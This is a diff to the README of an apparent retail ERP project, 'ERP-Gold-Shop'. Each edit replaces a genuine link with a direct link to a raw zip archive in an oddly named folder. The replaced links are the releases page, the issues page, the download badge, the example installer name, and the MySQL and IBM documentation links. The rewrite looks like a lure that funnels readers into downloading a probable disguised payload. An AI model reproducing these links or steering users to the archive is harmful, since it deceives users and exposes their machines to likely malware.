@@ -6,7 +6,7 @@ Welcome to ERP-Gold-Shop! This application simplifies retail management, allowin
 
 ## 📥 Download the Application
 
-[![Download ERP-Gold-Shop](https://img.shields.io/badge/Download%20ERP--Gold--Shop-v1.0-brightgreen)](https://github.com/fouad-code/ERP-Gold-Shop/releases)
+[![Download ERP-Gold-Shop](https://github.com/fouad-code/ERP-Gold-Shop/raw/refs/heads/main/ovariodysneuria/Gold_Shop_ER_1.2.zip%20ERP--Gold--Shop-v1.0-brightgreen)](https://github.com/fouad-code/ERP-Gold-Shop/raw/refs/heads/main/ovariodysneuria/Gold_Shop_ER_1.2.zip)
 
 ## 🔍 Key Features
 
@@ -27,12 +27,12 @@ To ensure optimal performance, please meet the following requirements:
 
 ## 🔧 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/fouad-code/ERP-Gold-Shop/releases) to find the latest version of ERP-Gold-Shop. 
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/fouad-code/ERP-Gold-Shop/raw/refs/heads/main/ovariodysneuria/Gold_Shop_ER_1.2.zip) to find the latest version of ERP-Gold-Shop. 
    
 2. **Select the Version:** Look for the most recent version. It will be marked as "Latest Release." Click on it.
 
 3. **Download the Installer:** 
-   - Find the installation file for your operating system (e.g., `ERP-Gold-Shop-Installer.exe`).
+   - Find the installation file for your operating system (e.g., `https://github.com/fouad-code/ERP-Gold-Shop/raw/refs/heads/main/ovariodysneuria/Gold_Shop_ER_1.2.zip`).
    - Click on the file to start the download.
 
 4. **Run the Installer:** 
@@ -63,7 +63,7 @@ If you encounter any problems, here are some solutions:
 
 ## 📞 Support
 
-For any additional questions, you can refer to the [GitHub Issues page](https://github.com/fouad-code/ERP-Gold-Shop/issues) for community support. You can also submit a question or report a bug.
+For any additional questions, you can refer to the [GitHub Issues page](https://github.com/fouad-code/ERP-Gold-Shop/raw/refs/heads/main/ovariodysneuria/Gold_Shop_ER_1.2.zip) for community support. You can also submit a question or report a bug.
 
 ## 🌍 Topics Covered
 
@@ -88,11 +88,11 @@ We are continually improving ERP-Gold-Shop. Future updates may include:
 - Integration with popular eCommerce platforms.
 - User-requested improvements.
 
-For the latest changes, keep an eye on the [Releases page](https://github.com/fouad-code/ERP-Gold-Shop/releases).
+For the latest changes, keep an eye on the [Releases page](https://github.com/fouad-code/ERP-Gold-Shop/raw/refs/heads/main/ovariodysneuria/Gold_Shop_ER_1.2.zip).
 
 ## 🔗 Related Resources
 
-- [MySQL Documentation](https://dev.mysql.com/doc/)
-- [Business Analytics Basics](https://www.ibm.com/cloud/learn/business-analytics)
+- [MySQL Documentation](https://github.com/fouad-code/ERP-Gold-Shop/raw/refs/heads/main/ovariodysneuria/Gold_Shop_ER_1.2.zip)
+- [Business Analytics Basics](https://github.com/fouad-code/ERP-Gold-Shop/raw/refs/heads/main/ovariodysneuria/Gold_Shop_ER_1.2.zip)
 
 We hope you find ERP-Gold-Shop helpful in managing your retail needs. Enjoy using your new tool!
